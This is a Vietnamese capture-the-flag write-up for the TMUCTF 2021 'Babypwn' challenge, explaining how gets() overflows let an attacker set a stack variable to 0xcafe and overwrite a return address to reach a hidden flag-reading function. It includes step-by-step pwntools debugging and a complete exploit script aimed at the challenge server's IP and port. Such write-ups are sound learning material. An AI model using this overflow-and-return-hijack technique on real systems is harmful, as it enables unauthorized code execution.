# Babypwn
> P/s: Bài này chỉ là một bài Overflow đơn giản thôi. Tuy nhiên đây là lần đầu mình giải được bài bằng cách viết script exploit bằng python, cũng như debug được đoạn script đấy nên mình quyết định sẽ ghi writeup để note lại các kiến thức mới mà mình học được. 
> Binary của bài này mình để trong tập tin **TMUCTF 2021**, mọi người có thể tải về để làm thử nhé.  
> Bắt đầu hoy!!!

Đầu tiên mình sẽ dùng lệnh `file` trong terminal của Ubuntu để kiểm tra sơ một số thông tin của file  

![image](https://user-images.githubusercontent.com/74854445/132864213-bcb30516-7495-4c88-b1c6-50ac50955954.png)  

Ta biết được đây là:
- File ELF (Executable and Linkable Format): File chỉ chạy trên linux
- 64 bit -> dùng các thanh ghi RAX,...RBP, RSP (mỗi thanh ghi sẽ ghi được 64 bit hay còn gọi là 8 bytes)
- Liên kết động (dynamically linked)
- Not stripped -> có bao gồm thông tin để debug nằm trong file

> Còn một vài cái nữa thông nữa được đưa ra nhưng do mình vẫn chưa biết nó có nghĩa gì =)) và nó cũng không quan trọng trong bài này lắm nên mình sẽ không nói đến  

Giờ thì bỏ vào `IDA64` để xem asm và nhấn `F5` để xem mã giả C (pseudocode) của của chương trình  

## Pseudocode của hàm main

![image](https://user-images.githubusercontent.com/74854445/132869213-295f9261-95d0-464c-a313-10ff4e3a2153.png)  

Ta có:
- Mảng ký tự `v4[28]` 
- Số nguyên `v5`
- `tmuglogo()` chỉ là hàm dùng để in ra logo của giải nên ta có thể bỏ qua
- `gets(v4)` => Lỗ hổng gây tràn bộ đệm 
- Nếu `v5 == 51966` hay viết dưới dạng số hex là `0xcafe` thì hàm `helloUser` sẽ được gọi

## Pseudocode của hàm helloUser  

![image](https://user-images.githubusercontent.com/74854445/132870812-6dc2db5e-39e3-4fe5-84e7-4293c0924ca3.png)  

Ta có:
- `gets(v2)` => 1 lỗ hổng gây tràn bộ đệm khác  

## Pseudocode của hàm wow

![image](https://user-images.githubusercontent.com/74854445/132871468-19347112-d369-4ccb-9970-44207afc1847.png)

Ngoài những hàm trên thì trong chương trình vẫn còn một hàm khác không nằm trong luồng của chương trình đó là hàm `wow`  

![image](https://user-images.githubusercontent.com/74854445/132871802-bcec5c72-3af5-403f-aa05-e948342988b9.png)

Tóm tắt là hàm này sẽ giúp ta đọc được file `flag.txt` trên server còn nếu không có file thì sẽ báo là `Missing ...`  

## Khai thác

### Cách 1:
Vậy mục tiêu của chúng ta là làm sao có thể nhảy được đến hàm `wow` là thành công  

Để đến được hàm `wow` ta sẽ cần phải ghi đè `return address` (địa chỉ trả về của một hàm)  

Vì chương trình có gọi hàm `helloUser` và trong hàm có lỗ hổng `gets(v2)` gây tràn bộ đệm  

-> Ghi đè được địa chỉ trả về của hàm `helloUser`

**=> Khi trả về sẽ được trả đến địa chỉ của hàm `wow`**  

Tiếp theo là làm sao nhảy được đến hàm `helloUser`  

Tương tự, trong hàm `main` cũng có lỗ hổng `gets(v4)` gây tràn bộ đệm  

Và vì `v5` là biến cục bộ (local variable), được lưu trữ trong stack  

Nên thông qua lỗ hổng trên ta có thể thay đổi được giá trị của biến `v5` thành `0xcafe` 

**=> Nhảy được đến hàm `helloUser`**  

### Cách 2  

Như đã nói ở trên, để đến được hàm `wow` ta sẽ cần phải ghi đè `return address` (địa chỉ trả về của một hàm)  

Và main thì cũng là một hàm, cũng có `return address` nên ta không cần phải làm lằng nhằng như cách 1  

Chỉ cần ghi đè `return address` của hàm main là được :3

## Debug Script Exploit

> Phần này là mình sẽ ghi chi tiết cách mình viết script exploit của bài này do đây là lần đầu mình debug được cái này =))) 
> nên nếu thấy phần này không cần thiết thì mọi người có thế đến phần Script Exploit để lấy xem script luôn  

Ở đây mình dùng:
- Python 3.8.10
- Pwntools 4.6.0
- Pwndbg  
- Sublime Text 4 (Build 4113)

Đầu tiên mình sẽ tạo một file `exploit.py` nằm cùng thư mục với file binary  

Rồi mở file exploit này bằng lệnh `subl exploit.py` để mình có thể code script trên Sublime Text (bạn cũng có thể dùng các chương trình khác để viết cũng được)  

Sau đó cửa sổ của Sublime Text sẽ hiện ra  

![image](https://user-images.githubusercontent.com/74854445/132884006-4b89af15-c596-4fc8-ab22-934ba95119d6.png)

Mình khuyến khích chia màn hình làm 2 như hình trên để có thể dễ dàng thao tác giữa terminal và trình viết code  

Những dòng code đầu tiên sẽ là:  

```py
#Thêm import toàn bộ framework pwntools
from pwn import *
```
Code phần mở file binary:

```py
#Mở file binary
elf = ELF("./babypwn")
p = elf.process()

#Nhận thông tin từ file binary và in ra màn hình
print(p.recv())
```

`Ctr + S` để save lại đoạn script trên rồi sang terminal gõ `python3 exploit.py` để chạy đoạn script  

![image](https://user-images.githubusercontent.com/74854445/132886937-d0b5fe52-8e34-4867-8a85-ca22a30908b1.png)

Do để `recv()` sẽ hơi khó nhìn nên mình sẽ đổi qua `recvuntill("\n")`  

Nghĩa là chỉ nhận thông tin tới ký rự `\n` rồi in ra  

Theo như thông tin nhận được từ lần chạy script trước thì có vẻ là có 8 dòng tất cả nên mình sẽ ghi 8 lần để nó in hết các dòng ra  

> Ai thích thì code thêm dòng for cho script ngắn bớt cũng được nhen =)))  

![image](https://user-images.githubusercontent.com/74854445/132887604-433f57aa-6500-437f-9d91-ac02e51f250c.png)

Đầu tiên mình sẽ viết payload để làm thay đổi giá trị biến `v5`  

Payload sẽ gồm 28 ký tự "a" cho mảng `v4[28]` và chuỗi "AAAABBBBCCCCDDDDEEEEFFFF"  

Do mình vẫn chưa biết chính xác biến v5 nằm ở đâu nên mình dùng chuỗi "AAAABBBBCCCCDDDDEEEEFFFF" để thăm dò  

Đoạn code như sau:  

```py
#Payload mình ghi dưới dạng mảng và ghi theo kiểu xuống dòng cho dễ nhìn  
#Vì cái mình muốn gửi tới chương trình là raw byte nên mình sẽ thêm chữ b"" đằng trước các chuỗi, ký tự
payload = [
	b"a"*28,
	b"AAAABBBBCCCCDDDDEEEEFFFF"
]

#Sau đó tiến hành ghép tất cả lại thành 1 chuỗi  
payload = b"".join(payload)  

#Ghi thêm cái này để trước khi gửi payload, script sẽ mở gdb để ta debug chương trình
gdb.attach(p, """b *main""")

#Gửi payload đến cho chương trình
p.sendline(payload)

#Cái giúp ta có thể giữ chương trình lại, tương tác được với chương
#Nếu không có dòng này thì khi chạy hết script chương trình sẽ kết thúc luôn, không debug được
p.interactive()
``` 

`Ctr + S` để save lại đoạn script trên rồi sang terminal gõ `python3 exploit.py` để chạy đoạn script  

![image](https://user-images.githubusercontent.com/74854445/132891405-d136995f-0a56-4945-aff6-5e450ffa72b6.png)

Lúc này sẽ xuất hiện thêm 1 cửa sổ thứ 3 để giúp ta debug  

Trong pwndbg ấn `n` liên tục để tới được instruction `cmp` (compare - so sánh) của hàm `main`  

![image](https://user-images.githubusercontent.com/74854445/134527142-d51fd4c7-4aee-4eaf-98d2-424791e2aa72.png)  

`dword ptr [rbp]` ý chỉ 4bytes bắt đầu từ địa chỉ nằm trong thanh ghi `rbp`  

`rpb - 4` nghĩa là lấy địa chỉ nằm trong `rbp` trừ cho 4  

Vậy `dword ptr [rbp - 4]` ý chỉ 4 bytes bắt đầu từ địa chỉ nằm trong rpb sau khi đã trừ cho 4  

> Chi tiết thêm về `dword ptr` xem tại [đây](http://www.cs.virginia.edu/~evans/cs216/guides/x86.html)

![image](https://user-images.githubusercontent.com/74854445/134555395-faf7b771-1ee2-4d5a-b676-e58c29e9f1ef.png)

Dùng lệnh `x` để xem bộ nhớ, xem nội dung của các địa chỉ, xem thêm về lệnh `x` ở [đây](https://visualgdb.com/gdbreference/commands/x)  

Ta thấy:  

- Thanh ghi `RBP` chứa địa chỉ `0x7ffe6f929600`, nói cách khác `0x7ffe6f929600` là vị trí mà con trỏ `RBP` đang trỏ vào  

- Vì `RBP` trỏ vào `0x7ffe6f929600` nên 8 bytes từ `0x7ffe6f929600` là phần `RBP` được push vào stack khi hàm main được gọi

- 8 bytes đó là `0x4242424243434343`, là 8 chữ `BBBBCCCC` mà ta ghi đè nội dung của phần `RBP` trong stack

- Thanh ghi `RSP` chứa địa chỉ `0x7ffe6f9295d0`, nói cách khác `0x7ffe6f9295d0` là vị trí mà con trỏ `RSP` đang trỏ vào 

Thông qua việc xác định `RBP`, `RSP` ta sẽ có thể dễ dàng hình dung stack như sau:

![image](https://user-images.githubusercontent.com/74854445/134560417-fddfc807-a6bb-460f-95dd-0a2ee8e4456b.png)

> *Ghi chú: Trong đa số các bộ vi xử lý (CPU) thì 1 địa chỉ sẽ đại diện cho 8 bits. Mỗi byte trong bộ nhớ sẽ có 1 địa chỉ riêng biệt*  
>
> rbp - 4 chính là bằng `0x7ffe6f929600 - 4 = 0x7ffe6f9295fc`, đây là địa chỉ của chữ A đầu tiên, 4 bytes từ địa chỉ này sẽ là AAAA  
>
> Bạn có thể đọc thêm về cách hiển thị memory address trong gdb tại [đây](https://bob.cs.sonoma.edu/IntroCompOrg-RPi/sec-gdb1.html)

Giờ đã xác định được vị trí của biến `v5` ta sẽ tiến hành sửa script lại để làm tràn `"0xcafe"` vào biến `v5`  

Ta có thể viết là  

```py 
payload = [
	b"a"*28,
	p32(0xcafe), # hay b"\xfe\xca" đều được 
]
```

Save và chạy lại đoạn script, trong trình gdb `n` liên tục thì sẽ thây lúc này chương trình đã nhảy vào hàm `helloUser`  

![image](https://user-images.githubusercontent.com/74854445/134931648-481d860e-a89b-469e-80b7-9ce08b7a34cc.png)

Thăm dò vị trí của `return address` tương tự như trên rồi viết thêm payload cho input của hàm `helloUser` là sẽ được script hoàn chỉnh như sau

## Script Exploit  

```py  
from pwn import *

#Dòng này sẽ giúp tin nhận hay gửi tin trong quá trình chạy script sẽ được in hết ra màn hình không cần phải dùng print() nữa
context.log_level = 'debug'

#Đoạn này dùng khi tương tác với file binary
#elf = ELF("./babypwn")
#p = elf.process()

#Đoạn này dùng khi tương tác với server
host = "185.239.107.54" 
port = 7010
p = remote(host,port)
 
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")

payload = [
	b"A"*28,
	p64(0xcafe)
]

payload = b"".join(payload)

payload2 = [
	b"a"*128,
	b"A"*8, 
	p64(0x4012ec)
]

payload2 = b"".join(payload2)

#Khi tương tác với server thì phải bỏ gdb.attach đi
#gdb.attach(p, """b *helloUser""")

p.sendline(payload)
p.sendline(payload2)
p.interactive()
```





